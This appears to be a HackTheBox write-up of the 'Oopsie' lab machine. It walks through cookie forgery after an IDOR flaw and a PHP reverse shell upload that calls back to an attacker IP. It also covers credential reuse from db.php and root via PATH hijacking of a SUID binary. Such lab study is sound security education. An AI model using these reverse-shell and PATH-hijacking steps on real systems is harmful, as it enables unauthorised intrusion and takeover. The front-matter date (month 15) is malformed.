---
layout: writeup
title: "Oopsie"
date: 2026-15-05
platform: HackTheBox
difficulty: Very-Easy
category: HackTheBox
os: Linux
tags: [idor, cookie-manipulation, file-upload, php-reverse-shell, path-hijacking, suid, broken-access-control]
description: "Oopsie is an Easy Linux machine that involves exploiting an IDOR vulnerability to escalate web privileges, uploading a PHP reverse shell, and abusing a SUID binary via PATH hijacking to achieve root."
image: /assets/writeups/oopsie/oopsie.png
---

## Summary

Oopsie is an Easy-rated Linux machine on HackTheBox that hosts a PHP-based web application. Initial access is achieved by exploiting an Insecure Direct Object Reference (IDOR) vulnerability to manipulate session cookies and gain admin-level access to the upload functionality. A PHP reverse shell is then uploaded and executed to obtain a foothold as `www-data`. Lateral movement is performed by recovering a plaintext password from a PHP database configuration file, which enables login as the `robert` user. Privilege escalation to root is accomplished by abusing a SUID binary (`bugtracker`) that calls `cat` without an absolute path, making it susceptible to PATH hijacking.

---

## Reconnaissance

An Nmap scan is performed against the target to identify open ports and running services.

```bash
nmap -sV -sC -Pn 10.129.95.191
```

![Nmap scan results]({{ '/assets/writeups/oopsie/image-1.png' | relative_url }})

*Nmap identifies two open ports: SSH (22) running OpenSSH 7.6p1 and HTTP (80) running Apache 2.4.29 on Ubuntu.*

The scan reveals a web server on port 80. Navigating to the target IP in a browser presents the MegaCorp Automotive website.

![MegaCorp Automotive home page]({{ '/assets/writeups/oopsie/image-2.png' | relative_url }})

*The MegaCorp Automotive landing page, indicating a web application is present on the target.*

---

## Enumeration

### Passive Crawling with Burp Suite

Before performing active directory brute-forcing, Burp Suite is used to passively crawl the web application. Passive crawling reveals site structure without sending unsolicited requests to the target.

![Burp Suite site map]({{ '/assets/writeups/oopsie/image-3.png' | relative_url }})

*Burp Suite's site map reveals the `/cdn-cgi/login` directory along with associated JavaScript files.*

The path `/cdn-cgi/login` is notable — navigating to it exposes a login page at `script.js`.

![Login page]({{ '/assets/writeups/oopsie/image-4.png' | relative_url }})

*The MegaCorp Automotive Repair Management System login page, accessible at `/cdn-cgi/login`.*

### Guest Access and Cookie Inspection

Default credential combinations fail to authenticate. The application does provide a "Login as Guest" option, which is used to gain initial, limited access.

![Logged in as Guest — Uploads restricted]({{ '/assets/writeups/oopsie/image-5.png' | relative_url }})

*Attempting to access the Uploads section as a Guest account returns: "This action require super admin rights."*

Inspecting the browser cookies via Developer Tools (right-click → Inspect → Application → Cookies) reveals two cookie values:

- `role`: `guest`
- `user`: `2233`

![Guest cookie values in Developer Tools]({{ '/assets/writeups/oopsie/image-6.png' | relative_url }})

*Browser Developer Tools showing the session cookies: `role=guest` and `user=2233`.*

### IDOR — Admin Account Discovery

The `user` cookie value (`2233`) corresponds to the currently authenticated account. The application exposes account details via a predictable URL parameter:

```
http://10.129.26.58/cdn-cgi/login/admin.php?content=accounts&id=2
```

Modifying the `id` parameter from `2` to `1` returns the admin account details — a classic **Insecure Direct Object Reference (IDOR)** vulnerability.

![IDOR — Guest account at id=2]({{ '/assets/writeups/oopsie/image-7.png' | relative_url }})

*Account lookup for `id=2` reveals the guest user's Access ID (2233).*

![IDOR — Admin account at id=1]({{ '/assets/writeups/oopsie/image-8.png' | relative_url }})

*Changing the `id` parameter to `1` discloses the admin user's Access ID (34322) and email address.*

### Cookie Manipulation — Privilege Escalation to Admin

With the admin's Access ID (`34322`) in hand, the session cookies are modified directly in the browser:

- `role` → `admin`
- `user` → `34322`

![Cookies updated to admin role]({{ '/assets/writeups/oopsie/image-9.png' | relative_url }})

*Developer Tools showing the modified cookies: `role=admin` and `user=34322`.*

Refreshing the Uploads page now grants access, confirming successful client-side privilege escalation.

![Upload page accessible as admin]({{ '/assets/writeups/oopsie/image-10.png' | relative_url }})

*The Branding Image Uploads page is now accessible after elevating the session cookie to admin.*

---

## Exploitation

### PHP Reverse Shell Upload

With admin access to the file upload functionality, a PHP reverse shell is prepared using the PentestMonkey template (available at [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)). The `$ip` and `$port` variables are updated to match the attacker's machine.

```php
$ip = '10.10.16.98';  // Attacker IP
$port = 9001;          // Listening port
```

The file is uploaded as `shellexec.php` via the Branding upload form.

![Reverse shell file uploaded successfully]({{ '/assets/writeups/oopsie/image-11.png' | relative_url }})

*The application confirms the upload: "The file shellexec.php has been uploaded."*

### Locating the Upload Directory

Gobuster is used to enumerate the web root and confirm the path where uploaded files are stored.

```bash
gobuster dir --url http://10.129.26.58/ --wordlist /usr/share/wordlists/dirb/common.txt -x php
```

![Gobuster output showing /uploads directory]({{ '/assets/writeups/oopsie/image-12.png' | relative_url }})

*Gobuster identifies the `/uploads` directory, confirming where uploaded files are accessible.*

### Triggering the Reverse Shell

A Netcat listener is started on the attacker machine:

```bash
nc -lnvp 9001
```

![Netcat listener started]({{ '/assets/writeups/oopsie/image-13.png' | relative_url }})

*Netcat listening on port 9001, ready to receive the incoming connection.*

The reverse shell is triggered by navigating to the uploaded file:

```
http://10.129.26.58/uploads/shellexec.php
```

A connection is established and a shell is returned as `www-data`.

![Reverse shell received as www-data]({{ '/assets/writeups/oopsie/image-14.png' | relative_url }})

*Netcat receives a connection from the target. The shell is running as `uid=33(www-data)`.*

### Shell Stabilization

The raw shell is upgraded to a fully interactive TTY using the following sequence:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z, then:
stty raw -echo; fg
stty rows 38 columns 116
```

---

## Post-Exploitation / Privilege Escalation

### Lateral Movement — Recovering Credentials from db.php

The `/etc/passwd` file is inspected to enumerate local system users. A user named `robert` is identified with a valid login shell (`/bin/bash`).

```bash
cat /etc/passwd
```

![/etc/passwd output highlighting robert]({{ '/assets/writeups/oopsie/image-15.png' | relative_url }})

*`/etc/passwd` confirms `robert` as a valid local user with UID 1000 and a Bash shell.*

A search for password-related strings in the web application directory is performed:

```bash
cat * | grep -i passw*
```

![Hardcoded admin password in index.php]({{ '/assets/writeups/oopsie/image-16.png' | relative_url }})

*A hardcoded admin credential (`MEGACORP_4dm1n!!`) is found in the login logic, but does not apply to `robert`.*

Inspecting `db.php` in the same directory reveals database credentials:

```bash
cat db.php
```

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

![db.php revealing robert's password]({{ '/assets/writeups/oopsie/image-17.png' | relative_url }})

*`db.php` contains a plaintext MySQL password for the user `robert`: `M3g4C0rpUs3r!`.*

This password is reused for the system account. Lateral movement to `robert` is achieved:

```bash
su robert
# Password: M3g4C0rpUs3r!
```

![Successful su to robert]({{ '/assets/writeups/oopsie/image-18.png' | relative_url }})

*Successful lateral movement to the `robert` user via `su` using the recovered database password.*

### User Flag

The user flag is retrieved from `robert`'s home directory:

```bash
cd /home/robert
cat user.txt
```

![User flag]({{ '/assets/writeups/oopsie/image-19.png' | relative_url }})

*The user flag is located at `/home/robert/user.txt`.*

### Privilege Escalation — SUID Binary + PATH Hijacking

Checking `robert`'s group memberships reveals membership in the `bugtracker` group:

```bash
id
```

![robert's group memberships]({{ '/assets/writeups/oopsie/image-20.png' | relative_url }})

*`robert` belongs to groups `robert(1000)` and `bugtracker(1001)`.*

The `sudo -l` command confirms that `robert` has no sudo privileges:

```bash
sudo -l
```

A search for files owned by or accessible to the `bugtracker` group is performed:

```bash
find / -group bugtracker 2>/dev/null
```

This returns a single result: `/usr/bin/bugtracker`. Inspecting the binary reveals it has the **SUID bit** set (runs with root privileges) and internally calls `cat` by name without specifying the full path.

**Attack vector:** If `/tmp` is injected at the beginning of the `$PATH` variable, a malicious `cat` script placed in `/tmp` will be executed instead of `/bin/cat` when `bugtracker` invokes the command.

**Step 1:** Write a fake `cat` script that spawns a shell:

```bash
echo '/bin/sh' > /tmp/cat
```

*Writing to `/tmp/cat` directly (not in the home directory) avoids permission errors.*

**Step 2:** Make it executable:

```bash
chmod +x /tmp/cat
```

**Step 3:** Prepend `/tmp` to the `$PATH`:

```bash
export PATH=/tmp:$PATH
echo $PATH
```

![PATH modified to include /tmp first]({{ '/assets/writeups/oopsie/image-21.png' | relative_url }})

*The modified `$PATH` now begins with `/tmp`, ensuring the malicious `cat` is found first.*

**Step 4:** Execute the `bugtracker` binary from `/tmp`:

```bash
cd /tmp
bugtracker
```

![Root shell obtained via bugtracker PATH hijacking]({{ '/assets/writeups/oopsie/image-22.png' | relative_url }})

*Executing `bugtracker` spawns a root shell. `whoami` confirms execution as `root`.*

When `bugtracker` calls `cat`, the shell resolves it to `/tmp/cat` (due to the modified `$PATH`), which executes `/bin/sh`. Because `bugtracker` carries the SUID bit, the resulting shell inherits root privileges.

### Root Flag

```bash
cd /root
cat root.txt
```

![Root flag]({{ '/assets/writeups/oopsie/image-23.png' | relative_url }})

*The root flag is retrieved from `/root/root.txt`.*

---

